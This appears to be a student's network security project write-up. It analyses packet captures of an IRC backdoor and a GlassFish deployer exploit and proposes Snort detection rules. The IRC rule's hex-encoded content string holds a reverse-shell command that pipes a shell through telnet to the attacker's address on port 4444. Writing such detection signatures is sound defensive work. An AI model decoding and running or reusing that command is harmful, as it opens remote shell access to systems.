# Network Exploit Analysis and Snort Rule Development

This project involves analyzing network traffic from two recorded exploits using Wireshark and developing Snort IDS rules to detect these attacks while minimizing false positives. 
The packet captures contain traffic from a network administrator who isolated known exploit attempts. 
The project includes two main analyses: an IRC Backdoor Exploit and a GlassFish Deployer Exploit.

IRC Backdoor Exploit Analysis:
File: irc_backdoor_exploit.pcapng

Attacker IP: 10.1.1.3
Victim IP: 10.2.2.4
Victim Port: 6697
Number of Attack Attempts: 2
Attack Payload Packets: [4, 11]
Proposed Snort Rule:
alert tcp 10.1.1.3 any -> 10.2.2.4 6697 (msg:"IRC Backdoor Exploit Attempt"; content:"41423b7368202d63202728736c65657020343631307c74656c6e65742031302e312e312e3320343434347c7768696c65203a203b20646f20736820262620627265616b3b20646f6e6520323e26317c74656c6e65742031302e312e312e332034343434203e2f6465762f6e756c6c20323e2631202629270a"; sid:1000001; rev:1;)

Feedback from Network Administrator: The command should look for a specific string pattern ("AB;") in the payload.

False Positives: The rule is specific to the payload content; however, it may still trigger false positives if the same payload pattern appears in legitimate traffic. 
Careful tuning and adding more context checks, such as specific sequences or additional packet attributes, may be required to reduce false positives.


GlassFish Deployer Exploit Analysis:
File: glassfish_deployer_exploit.pcapng

Attacker IP: 10.1.1.3
Victim IP: 10.2.2.3
Victim Port: 4848
Number of Attack Attempts: 3
Attack Payload Packets: [38, 85, 132]
Proposed Snort Rule:
alert tcp 10.1.1.3 any -> 10.2.2.3 4848 (msg:"GlassFish Deployer Exploit Attempt"; content:"3c7469746c653e4465706c6f7920456e7465727072697365204170706c69636174696f6e732f4d6f64756c65733c2f7469746c653e0a6f732e6e616d65203d204c696e75780a6f732e61726368203d20783836"; sid:1000002; rev:1;)

Feedback from Network Admin: The rule should specifically look for "post" or "upload" and ".war".

Attack Identification: The payload content indicates the deployment of a malicious application/module to the GlassFish server, likely exploiting a vulnerability in the deployment functionality. 
This attack pattern aligns with exploits targeting the GlassFish server's deployment service, specifically CVE-2011-0807.

False Positives: Similar to the IRC Backdoor rule, this Snort rule is based on specific payload content. 
Legitimate deployments or configurations with similar payload patterns may trigger false positives. Adding more context to the rule, such as checking for additional malicious indicators or behaviors, can help minimize false positives.

Learning and Improvement:

During this project, valuable feedback from a network administrator significantly enhanced my understanding and skills in creating Snort IDS rules. Here are some key takeaways:

Specific Pattern Matching: Initially, my Snort rules were too general, which could lead to a high rate of false positives. The feedback emphasized the importance of looking for specific string patterns within the payload, such as "AB;" in the IRC Backdoor Exploit. This helped me refine the rule to be more precise.
Understanding Context: The suggestion to include checks for specific actions like "post," "upload," and ".war" in the GlassFish Deployer Exploit was crucial. This feedback taught me that understanding the context of the attack and incorporating it into the rule can greatly improve detection accuracy while reducing false positives.
Continuous Learning: The feedback loop highlighted the importance of continuous learning and adaptation. It reminded me that in the field of cybersecurity, especially when working with tools like Snort, it's essential to keep refining rules based on observed behavior and expert insights.
This feedback has not only improved the quality of the Snort rules I developed but also deepened my understanding of network security practices.

